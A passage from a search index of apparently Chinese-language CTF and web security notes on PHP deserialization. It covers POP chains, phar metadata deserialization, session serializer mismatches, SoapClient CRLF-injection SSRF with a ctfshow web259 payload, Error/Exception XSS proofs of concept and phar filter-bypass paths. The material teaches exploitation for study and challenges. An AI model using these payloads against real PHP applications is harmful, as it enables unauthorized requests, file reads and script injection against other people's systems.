\u53ef\u4ee5\u8bbf\u95ee \u4e0d\u80fd\u8bbf\u95ee \u5916\u90e8 \u53ef\u4ee5\u8bbf\u95ee \u4e0d\u80fd\u8bbf\u95ee \u4e0d\u80fd\u8bbf\u95ee \u9b54\u672f\u65b9\u6cd5 \u9b54\u672f\u65b9\u6cd5 \u4f55\u65f6\u8c03\u7528 __construct **\u521b\u5efa\u65b0\u5bf9\u8c61**\u65f6\u8c03\u7528 __wakeup \u5728**\u4f7f\u7528 unserialize() \u65f6**\uff0c\u4f1a\u68c0\u67e5\u662f\u5426\u5b58\u5728\u4e00\u4e2a __wakeup() \u9b54\u672f\u65b9\u6cd5\u3002\u5982\u679c\u5b58\u5728\uff0c\u5219\u8be5\u65b9\u6cd5\u4f1a\u5148\u88ab\u8c03\u7528\uff0c\u9884\u5148\u51c6\u5907\u5bf9\u8c61\u9700\u8981\u7684\u8d44\u6e90 __toString __toString() \u65b9\u6cd5\u7528\u4e8e\u5b9a\u4e49\u4e00\u4e2a\u7c7b\u88ab**\u5f53\u6210\u5b57\u7b26\u4e32\u65f6**\u8be5\u5982\u4f55\u5904\u7406 __destruct __destruct\u51fd\u6570\u4f1a\u5728\u5230\u67d0\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u5f15\u7528\u90fd\u88ab\u5220\u9664\u6216\u8005\u5f53\u5bf9\u8c61\u88ab\u663e\u5f0f\u9500\u6bc1\u65f6\u6267\u884c __invoke \u5f53\u5c1d\u8bd5**\u4ee5\u8c03\u7528\u51fd\u6570\u7684\u65b9\u5f0f\u8c03\u7528\u4e00\u4e2a\u5bf9\u8c61**\u65f6\uff0c __invoke() \u65b9\u6cd5\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528\uff08\u7c7b\u540d+\u62ec\u53f7\u5f62\u5f0f\uff09 __set **\u7ed9\u4e0d\u53ef\u8bbf\u95ee\u5c5e\u6027\u8d4b\u503c**\u65f6\uff0c __set() \u4f1a\u88ab\u8c03\u7528 __get **\u8bfb\u53d6\u4e0d\u53ef\u8bbf\u95ee\u5c5e\u6027**\u8d4b\u503c\u65f6\uff0c __get() \u4f1a\u88ab\u8c03\u7528 __unset \u5bf9**\u4e0d\u53ef\u8bbf\u95ee\u5c5e\u6027\u8c03\u7528unset()**\u65f6\uff0c __unset() \u4f1a\u88ab\u8c03\u7528 __isset \u5728**\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u4e0a\u8c03\u7528isset()**\u6216empty()\u89e6\u53d1 __call \u5728\u5bf9\u8c61\u4e2d\u8c03\u7528\u4e00\u4e2a**\u4e0d\u53ef\u8bbf\u95ee\u65b9\u6cd5**\u65f6\uff0c __call() \u4f1a\u88ab\u8c03\u7528 __sleep \u6267\u884c**serialize()**\u65f6\uff0c\u5148\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570","title":"\u57fa\u7840\u77e5\u8bc6"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#pop","text":"\u5982\u679c\u5173\u952e\u4ee3\u7801\u4e0d\u5728\u9b54\u672f\u65b9\u6cd5\u4e2d\uff0c\u800c\u662f\u5728\u4e00\u4e2a\u7c7b\u7684\u666e\u901a\u65b9\u6cd5\u4e2d\u3002\u8fd9\u65f6\u5019\u53ef\u4ee5\u901a\u8fc7\u5bfb\u627e\u76f8\u540c\u7684\u51fd\u6570\u540d\u5c06\u7c7b\u7684\u5c5e\u6027\u548c\u654f\u611f\u51fd\u6570\u7684\u5c5e\u6027\u8054\u7cfb\u8d77\u6765 <?php class Modifier { protected $var ; public function append ( $value ){ include ( $value ); } public function __invoke (){ $this -> append ( $this -> var ); } } class Show { public $source ; public $str ; public function __construct ( $file = 'index.php' ){ $this -> source = $file ; echo 'Welcome to ' . $this -> source . \"<br>\" ; } public function __toString (){ return $this -> str -> source ; } public function __wakeup (){ if ( preg_match ( \"/gopher|http|file|ftp|https|dict|\\.\\./i\" , $this -> source )) { echo \"hacker\" ; $this -> source = \"index.php\" ; } } } class Test { public $p ; public function __construct (){ $this -> p = array (); } public function __get ( $key ){ $function = $this -> p ; return $function (); } } \u6700\u7ec8\u662f\u5e0c\u671b\u901a\u8fc7 Modifier \u5f53\u4e2d\u7684 append \u65b9\u6cd5\u5b9e\u73b0\u672c\u5730\u6587\u4ef6\u5305\u542b\u8bfb\u53d6\u6587\u4ef6\uff0c\u56de\u6eaf\u5230\u8c03\u7528\u5b83\u7684 __invoke \uff0c\u5f53\u6211\u4eec**\u5c06\u5bf9\u8c61\u8c03\u7528\u4e3a\u51fd\u6570\u65f6\u89e6\u53d1**,\u53d1\u73b0\u5728 Test \u7c7b\u5f53\u4e2d\u7684 __get \u65b9\u6cd5\uff0c\u518d\u56de\u6eaf\u5230 Show \u5f53\u4e2d\u7684 __toString \uff0c\u518d\u56de\u6eaf\u5230 Show \u5f53\u4e2d\u7684 __wakeup \u5f53\u4e2d\u6709preg_match\u53ef\u4ee5\u89e6\u53d1 __toString","title":"POP\u94fe"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_2","text":"\u5bf9\u8c61\u6ce8\u5165\u524d\u63d0\uff1a 1\u3001 unserialize \u7684\u53c2\u6570\u53ef\u63a7\u3002 2\u3001 \u4ee3\u7801\u91cc\u6709\u5b9a\u4e49\u4e00\u4e2a\u542b\u6709\u9b54\u672f\u65b9\u6cd5\u7684\u7c7b\uff0c\u5e76\u4e14\u8be5\u65b9\u6cd5\u91cc\u51fa\u73b0\u4e00\u4e9b\u4f7f\u7528\u7c7b\u6210\u5458\u53d8\u91cf\u4f5c\u4e3a\u53c2\u6570\u7684\u5b58\u5728\u5b89\u5168\u95ee\u9898\u7684\u51fd\u6570\u3002 <?php class Person { public $name = \"cat\" ; public $age = 2 ; } $b = new Person (); $b -> name = 'dog' ; $b -> age = 3 ; echo serialize ( $b ); // O:6:\"Person\":2:{s:4:\"name\";s:3:\"dog\";s:3:\"age\";i:3;} echo urlencode ( serialize ( $b )); ?> \u628a\u5e8f\u5217\u5316\u540e\u5b57\u7b26\u4e32\u8fdb\u884c\u63d0\u4ea4\uff0c\u53cd\u5e8f\u5217\u5316\u65f6\u89e6\u53d1\u5bf9\u8c61\u6ce8\u5165","title":"\u5bf9\u8c61\u6ce8\u5165"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#php_1","text":"","title":"PHP\u539f\u751f\u53cd\u5e8f\u5217\u5316"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#soapclient","text":"php\u5728\u5b89\u88c5php-soap\u62d3\u5c55\u540e\uff0c\u53ef\u4ee5\u53cd\u5e8f\u5217\u5316\u539f\u751f\u7c7bSoapClient\uff0c\u6765\u53d1\u9001http post\u8bf7\u6c42\u3002 \u5fc5\u987b\u8c03\u7528SoapClient\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u89e6\u53d1SoapClient\u7684__call\u9b54\u672f\u65b9\u6cd5\u3002 \u901a\u8fc7CRLF\u6765\u6dfb\u52a0\u8bf7\u6c42\u4f53\uff1aSoapClient\u53ef\u4ee5\u6307\u5b9a\u8bf7\u6c42\u7684user-agent\u5934\uff0c\u901a\u8fc7\u6dfb\u52a0\u6362\u884c\u7b26\u7684\u5f62\u5f0f\u6765\u52a0\u5165\u5176\u4ed6\u8bf7\u6c42\u5185\u5bb9 \u9996\u5148\u5728VPS\u4e0a\u9762\u5f00\u542f\u76d1\u542c nc -lvvp 9328 \u8fd0\u884c <?php $a = new SoapClient ( null , array ( 'uri' => 'aaa' , 'location' => 'http://127.0.0.1:5555/path' )); $b = serialize ( $a ); echo $b ; $c = unserialize ( $b ); $c -> dotast (); //\u8c03\u7528\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u8ba9SoapClient\u8c03\u7528__call vps\u4f1a\u6536\u5230\u8bf7\u6c42\uff0c\u5176\u4e2d\u7684header\u5b58\u5728 SOAPAction: \"aaa#dotast\" \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u6ce8\u5165\u6211\u4eec\u81ea\u5df1\u6076\u610f\u6784\u9020\u7684**CRLF**\u5373\u63d2\u5165**\\r\\n**\uff0c\u6765\u63a7\u5236POST\u8bf7\u6c42\u5934 <?php $a = new SoapClient ( null , array ( 'uri' => \"aaa \\r\\n\\r\\n bbb \\r\\n \" , 'location' => 'http://127.0.0.1:5555/path' )); $b = serialize ( $a ); echo $b ; $c = unserialize ( $b ); $c -> dotast (); \u4f46\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u9700\u8981\u89e3\u51b3\uff0cPOST\u6570\u636e\u6307\u5b9a\u8bf7\u6c42\u5934\u4e3a Content-Type:application/x-www-form-urlencoded \uff0c\u6211\u4eec\u9700\u8981\u63a7\u5236 Content-Type \uff0c\u4f46\u4ece\u4e0a\u56fe\u4e2d\u53ef\u4ee5\u53d1\u73b0\u5b83\u4f4d\u4e8e SOAPAtion \u4e0a\u65b9 \u7ee7\u7eed\u5f80\u4e0a\uff0c\u53ef\u4ee5\u53d1\u73b0 User-Agent \u4f4d\u4e8e Content-Type \u4e0a\u65b9\uff0c\u8fd9\u4e2a\u4f4d\u7f6e\u4e5f\u53ef\u4ee5\u8fdb\u884c\u6ce8\u5165\uff0c\u6240\u4ee5\u6211\u4eec\u518d User-Agent \u8fdb\u884c\u6ce8\u5165 <?php $post_string = \"dotast=cool\" ; $a = new SoapClient ( null , array ( 'location' => 'http://127.0.0.1:5555/path' , 'user_agent' => \"dotast \\r\\n Content-Type:application/x-www-form-urlencoded \\r\\n \" . \"Content-Length: \" . ( string ) strlen ( $post_string ) . \" \\r\\n\\r\\n \" . $post_string , 'uri' => \"aaa\" )); $b = serialize ( $a ); echo $b ; $c = unserialize ( $b ); $c -> dotast (); \u5982\u56fe\uff0c\u6784\u9020\u4efb\u610fpost\u8bf7\u6c42\u6210\u529f\uff01\u5230\u6b64\uff0c\u4e00\u7cfb\u5217\u6d41\u7a0b\u90fd\u5f04\u61c2\u540e\uff0c\u6211\u4eec\u56de\u5230ctfshow-web259\u9898\u76ee\u672c\u8eab flag.php $xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); array_pop($xff); $ip = array_pop($xff); if($ip!=='127.0.0.1'){ die('error'); }else{ $token = $_POST['token']; if($token=='ctfshow'){ file_put_contents('flag.txt',$flag); } } index.php <?php highlight_file ( __FILE__ ); $vip = unserialize ( $_GET [ 'vip' ]); //vip can get flag one key $vip -> getFlag (); \u5229\u7528ssrf\u8bbf\u95eeflag.php\uff0c\u7136\u540e\u6784\u9020post\u6570\u636e token=ctfshow \u8fd8\u6709xff\u8bf7\u6c42\u5934\uff0cpaylaod\u5982\u4e0b <?php $post_string = \"token=ctfshow\" ; $a = new SoapClient ( null , array ( 'location' => 'http://127.0.0.1/flag.php' , 'user_agent' => \"dotast \\r\\n Content-Type:application/x-www-form-urlencoded \\r\\n \" . \"X-Forwarded-For: 127.0.0.1,127.0.0.1 \\r\\n \" . \"Content-Length: \" . ( string ) strlen ( $post_string ) . \" \\r\\n\\r\\n \" . $post_string , 'uri' => \"aaa\" )); $b = serialize ( $a ); echo urlencode ( $b ); \u8fd9\u91cc X-Forwarded-For \u91cc\u9762\u9700\u8981\u4e24\u4e2a 127.0.0.1 \u7684\u539f\u56e0\u662fdocker\u73af\u5883cloudfare\u4ee3\u7406\u6240\u5bfc\u81f4 \u8fd0\u884cphp get\u53c2\u6570 vip \u4f20\u5165 \u518d\u8bbf\u95eeflag.txt\u5c31\u6709\u4e86","title":"SoapClient"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#error","text":"Error\u7c7b\u5c31\u662fphp\u7684\u4e00\u4e2a\u5185\u7f6e\u7c7b\u7528\u4e8e\u81ea\u52a8\u81ea\u5b9a\u4e49\u4e00\u4e2a Error \uff0c\u5728php7\u7684\u73af\u5883\u4e0b\u53ef\u80fd\u4f1a\u9020\u6210\u4e00\u4e2a xss \u6f0f\u6d1e\uff0c\u56e0\u4e3a\u5b83\u5185\u7f6e\u6709\u4e00\u4e2a toString \u7684\u65b9\u6cd5\u3002 <?php $a = $_GET [ 'test' ]; echo unserialize ( $a ); \u6784\u9020poc <?php $a = new Error ( \"<script>alert('xss')</script>\" ); $b = serialize ( $a ); echo urlencode ( $b ); ?> \u5c06\u5e8f\u5217\u5316\u540e\u7684\u5b57\u7b26\u4e32\u4f20\u5165test\u53d8\u91cf\u5373\u53ef**\u9020\u6210\u5f39\u7a97** Exception\u7c7b\u8ddfError\u7c7b\u539f\u7406\u4e00\u6837\uff0c\u4f46\u662f\u4e5f\u9002\u7528\u4e8ePHP5 <?php $x = new Exception ( \"<script>alert('xss')</script>\" ); $y = serialize ( $x ); echo urlencode ( $y ); ?>","title":"Error"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#pharweb276","text":"","title":"Phar\u53cd\u5e8f\u5217\u5316web276"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_3","text":"phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data \u5f53\u53d7\u5f71\u54cd\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u8c03\u7528phar\u6587\u4ef6\u65f6\uff0c\u4f1a\u81ea\u52a8\u53cd\u5e8f\u5217\u5316meta-data\u5185\u7684\u5185\u5bb9","title":"\u539f\u7406"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#phar","text":"PHAR\uff08PHP\u5f52\u6863\uff09\u6587\u4ef6\u662f\u4e00\u79cd\u6253\u5305\u683c\u5f0f\uff0c\u901a\u8fc7\u5c06\u8bb8\u591aPHP\u4ee3\u7801\u6587\u4ef6\u548c\u5176\u4ed6\u8d44\u6e90\uff08\u4f8b\u5982\u56fe\u50cf\uff0c\u6837\u5f0f\u8868\u7b49\uff09\u6346\u7ed1\u5230\u4e00\u4e2a\u5f52\u6863\u6587\u4ef6 php\u901a\u8fc7\u7528\u6237\u5b9a\u4e49\u548c\u5185\u7f6e\u7684\u201c\u6d41\u5305\u88c5\u5668\u201d\u5b9e\u73b0\u590d\u6742\u7684\u6587\u4ef6\u5904\u7406\u529f\u80fd\u3002 phar:// \u5c31\u662f\u4e00\u79cd\u5185\u7f6e\u7684\u6d41\u5305\u88c5\u5668 php\u4e2d\u4e00\u4e9b\u5e38\u89c1\u7684\u6d41\u5305\u88c5\u5668\u5982\u4e0b\uff1a file:// \u2014 \u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\uff0c\u5728\u7528\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570\u65f6\u9ed8\u8ba4\u5c31\u4f7f\u7528\u8be5\u5305\u88c5\u5668 http:// \u2014 \u8bbf\u95ee HTTP(s) \u7f51\u5740 ftp:// \u2014 \u8bbf\u95ee FTP(s) URLs php:// \u2014 \u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09 zlib:// \u2014 \u538b\u7f29\u6d41 data:// \u2014 \u6570\u636e\uff08RFC 2397\uff09 glob:// \u2014 \u67e5\u627e\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84\u6a21\u5f0f phar:// \u2014 PHP \u5f52\u6863 ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 \u97f3\u9891\u6d41 expect:// \u2014 \u5904\u7406\u4ea4\u4e92\u5f0f\u7684\u6d41","title":"phar\u6587\u4ef6"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#phar_1","text":"stub:phar\u6587\u4ef6\u7684\u6807\u5fd7\uff0c\u5fc5\u987b\u4ee5 xxx __HALT_COMPILER();?> \u7ed3\u5c3e\uff0c\u5426\u5219\u65e0\u6cd5\u8bc6\u522b\u3002xxx\u53ef\u4ee5\u4e3a\u81ea\u5b9a\u4e49\u5185\u5bb9\u3002 manifest:phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u90fd\u653e\u5728\u8fd9\u90e8\u5206\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data\uff0c\u8fd9\u662f\u6f0f\u6d1e\u5229\u7528\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002 content:\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9 signature (\u53ef\u7a7a):\u7b7e\u540d\uff0c\u653e\u5728\u672b\u5c3e\u3002","title":"phar\u6587\u4ef6\u7ed3\u6784"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#phar-demo","text":"\u6839\u636e\u6587\u4ef6\u7ed3\u6784\u6211\u4eec\u6765\u81ea\u5df1\u6784\u5efa\u4e00\u4e2aphar\u6587\u4ef6\uff0cphp\u5185\u7f6e\u4e86\u4e00\u4e2aPhar\u7c7b\u6765\u5904\u7406\u76f8\u5173\u64cd\u4f5c \u8981\u5c06php.ini\u4e2d\u7684phar.readonly\u9009\u9879\u8bbe\u7f6e\u4e3aOff\uff0c\u5426\u5219\u65e0\u6cd5\u751f\u6210phar\u6587\u4ef6 <?php class TestObject { public $data ; } //@unlink(\"phar.phar\"); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new TestObject (); $o -> data = 'hello' ; $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> \u8bbf\u95ee\u540e\uff0c\u4f1a\u751f\u6210\u4e00\u4e2aphar.phar\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230meta-data\u662f\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7684\u3002 \u901a\u8fc7 phar:// \u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\uff0c\u90fd\u4f1a\u5c06meta-data\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u90e8\u5206\u53d7\u5f71\u54cd\u7684\u51fd\u6570\u5217\u8868\uff1a fileatime / filectime / filemtime stat / fileinode / fileowner / filegroup / fileperms file / file_get_contents / readfile / `fopen`` file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable parse_ini_file unlink copy \u4ee5\u5e38\u7528\u7684\u51fd\u6570 file_get_contents() \u51fd\u6570\u4e3e\u4f8b\uff1a <?php class TestObject { function __destruct () { echo $this -> data ; // TODO: Implement __destruct() method. } } file_get_contents ( 'phar://phar.phar/test.txt' ); \u4e0a\u8ff0\u4f8b\u7a0b\u4f1a\u8f93\u51fahello","title":"phar demo"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_4","text":"phar\u6587\u4ef6\u8981\u80fd\u591f\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u7aef\u3002 \u8981\u6709\u53ef\u7528\u7684\u9b54\u672f\u65b9\u6cd5\u4f5c\u4e3a\u201c\u8df3\u677f\u201d\u3002 \u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u7684\u53c2\u6570\u53ef\u63a7\uff0c\u4e14 : \u3001 / \u3001 phar \u7b49\u7279\u6b8a\u5b57\u7b26\u6ca1\u6709\u88ab\u8fc7\u6ee4\u3002","title":"\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_5","text":"\u5f53\u73af\u5883\u9650\u5236\u4e86phar\u4e0d\u80fd\u51fa\u73b0\u5728\u524d\u9762\u7684\u5b57\u7b26\u91cc\u3002\u53ef\u4ee5\u4f7f\u7528 compress.bzip2:// \u548c compress.zlib:// \u7b49\u7ed5\u8fc7 compress.bzip://phar:///test.phar/test.txt compress.bzip2://phar:///test.phar/test.txt compress.zlib://phar:///home/sx/test.phar/test.txt php://filter/resource=phar:///test.phar/test.txt php://filter/read=convert.base64-encode/resource=phar://test.phar/test.txt GIF\u683c\u5f0f\u9a8c\u8bc1\u53ef\u4ee5\u901a\u8fc7\u5728\u6587\u4ef6\u5934\u90e8\u6dfb\u52a0GIF89a\u7ed5\u8fc7 $phar->setStub(\"GIF89a\".\" <?php __HALT_COMPILER (); ?> \"); //\u8bbe\u7f6estub \u751f\u6210\u4e00\u4e2aphar.phar\uff0c\u4fee\u6539\u540e\u7f00\u540d\u4e3aphar.gif \u7136\u540e\u4e0a\u4f20\uff0c\u901a\u8fc7 file_get_contents \u6216\u8005 unlink \u7b49\u65b9\u6cd5\u89e3\u5305\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\uff08\u901a\u5e38\u4f7f\u7528\u5728\u6ca1\u6709\u660e\u663e\u53cd\u5e8f\u5217\u5316\u4f20\u53c2\u7684\u9898\u76ee\u4e2d\uff09","title":"\u7ed5\u8fc7\u65b9\u5f0f"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#php-session","text":"","title":"php-session\u53cd\u5e8f\u5217\u5316"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#session","text":"\u5f53\u7b2c\u4e00\u6b21\u8bbf\u95ee\u7f51\u7ad9\u65f6\uff0c session_start() \u51fd\u6570\u5c31\u4f1a\u521b\u5efa\u4e00\u4e2a\u552f\u4e00\u7684Session ID\uff0c\u5e76\u81ea\u52a8\u901a\u8fc7HTTP\u7684\u54cd\u5e94\u5934\uff0c\u5c06\u8fd9\u4e2aSession ID\u4fdd\u5b58\u5230\u5ba2\u6237\u7aefCookie\u4e2d\u3002 \u540c\u65f6\uff0c\u4e5f\u5728\u670d\u52a1\u5668\u7aef\u521b\u5efa\u4e00\u4e2a\u4ee5Session ID\u547d\u540d\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u4fdd\u5b58\u8fd9\u4e2a\u7528\u6237\u7684\u4f1a\u8bdd\u4fe1\u606f\u3002 \u5f53\u540c\u4e00\u4e2a\u7528\u6237\u518d\u6b21\u8bbf\u95ee\u8fd9\u4e2a\u7f51\u7ad9\u65f6\uff0c\u4e5f\u4f1a\u81ea\u52a8\u901a\u8fc7HTTP\u7684\u8bf7\u6c42\u5934\u5c06Cookie\u4e2d\u4fdd\u5b58\u7684Seesion ID\u518d\u643a\u5e26\u8fc7\u6765\uff0c\u8fd9\u65f6 session_start() \u51fd\u6570\u5c31\u4e0d\u4f1a\u518d\u53bb\u5206\u914d\u4e00\u4e2a\u65b0\u7684Session ID\uff0c\u800c\u662f\u5728\u670d\u52a1\u5668\u7684\u786c\u76d8\u4e2d\u53bb\u5bfb\u627e\u548c\u8fd9\u4e2aSession ID\u540c\u540d\u7684Session\u6587\u4ef6\uff0c\u5c06\u8fd9\u4e4b\u524d\u4e3a\u8fd9\u4e2a\u7528\u6237\u4fdd\u5b58\u7684\u4f1a\u8bdd\u4fe1\u606f\u8bfb\u51fa\uff0c\u5728\u5f53\u524d\u811a\u672c\u4e2d\u5e94\u7528\uff0c\u8fbe\u5230\u8ddf\u8e2a\u8fd9\u4e2a\u7528\u6237\u7684\u76ee\u7684\u3002","title":"session\u4ecb\u7ecd"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#session_1","text":"php\u4e2d\u7684session\u4e2d\u7684\u5185\u5bb9\u5e76\u4e0d\u662f\u653e\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u9ed8\u8ba4\u662f\u4ee5**\u6587\u4ef6**\u7684\u65b9\u5f0f\u6765\u5b58\u50a8\u7684\uff08\u7531\u914d\u7f6e\u9879 session.save_handler \u5b9a\u4e49\uff09 \u5b58\u50a8\u7684\u6587\u4ef6\u662f\u4ee5 sess_sessionid \u6765\u8fdb\u884c\u547d\u540d\u7684 \u9664\u4e86\u9ed8\u8ba4\u7684php\u5f15\u64ce\u4e4b\u5916\uff0c\u8fd8\u5b58\u5728\u5176\u4ed6\u5f15\u64ce\uff0c\u4e0d\u540c\u7684\u5f15\u64ce\u6240\u5bf9\u5e94\u7684session\u7684\u5b58\u50a8\u65b9\u5f0f\u4e0d\u76f8\u540c \u5904\u7406\u5f15\u64ce\u540d\u79f0 \u50a8\u5b58\u683c\u5f0f php \u952e\u540d + \u7ad6\u7ebf + \u7ecf\u8fc7 serialize() \u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684\u503c php_binary \u952e\u540d\u7684\u957f\u5ea6\u5bf9\u5e94\u7684 ASCII \u5b57\u7b26 + \u952e\u540d + \u7ecf\u8fc7 serialize() \u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684\u503c php_serialize \u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684**\u6570\u7ec4** \u5373\u5728**\u9ed8\u8ba4\u5f15\u64ce**\u60c5\u51b5\u4e0b\uff0c $_SESSION['name'] = 's1ng'; \u4ee3\u7801\u4f1a\u5728 /var/lib/php/sessions/ (\u4e5f\u53ef\u80fd\u5728 /tmp/sess_ )\u4e0b\u521b\u5efa sess_at9ih163p9tadfhdn8f721l7s9 \u6587\u4ef6\uff0c\u6587\u4ef6\u7684\u5185\u5bb9\u4e3a name|s:4:\"s1ng\"; \u82e5\u5728**php_serialize\u5f15\u64ce**\u4e0b\uff1a ini_set('session.serialize_handler', 'php_serialize'); session_start(); $_SESSION['name'] = 's1ng'; \u53ef\u4ee5\u5f97\u5230\uff1a ;root@SYY:/var/lib/php/sessions# cat sess_at9ih163p9tadfhdn8f721l7s9 a:1:{s:4:\"name\";s:4:\"s1ng\";} a:1 \u662f\u4f7f\u7528php_serialize\u8fdb\u884c\u5e8f\u5217\u8bdd\u90fd\u4f1a\u52a0\u4e0a\u3002\u540c\u65f6\u4f7f\u7528php_serialize\u4f1a\u5c06session\u4e2d\u7684key\u548cvalue\u90fd\u4f1a\u8fdb\u884c\u5e8f\u5217\u5316\u3002 \u5728**php_binary\u5f15\u64ce**\u4e0b\uff1a ini_set('session.serialize_handler', 'php_binary'); session_start(); $_SESSION['name'] = 's1ng'; \u8f93\u51fa\uff1a root@SYY:/var/lib/php/sessions# cat sess_at9ih163p9tadfhdn8f721l7s9 \uff08\u8fd9\u91cc\u6709\u4e00\u4e2aascii\u4e3a4\u7684\u4e0d\u53ef\u663e\u5b57\u7b26\uff09names:4:\"s1ng\";","title":"session\u7684\u5b58\u50a8"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#php-session_1","text":"PHP\u5728\u53cd\u5e8f\u5217\u5316\u5b58\u50a8\u7684 $_SESSION \u6570\u636e\u65f6\u4f7f\u7528\u7684\u5f15\u64ce\u548c\u5e8f\u5217\u5316\u4f7f\u7528\u7684\u5f15\u64ce\u4e0d\u4e00\u6837\uff0c\u4f1a\u5bfc\u81f4\u6570\u636e\u65e0\u6cd5\u6b63\u786e\u7684\u53cd\u5e8f\u5217\u5316\u3002 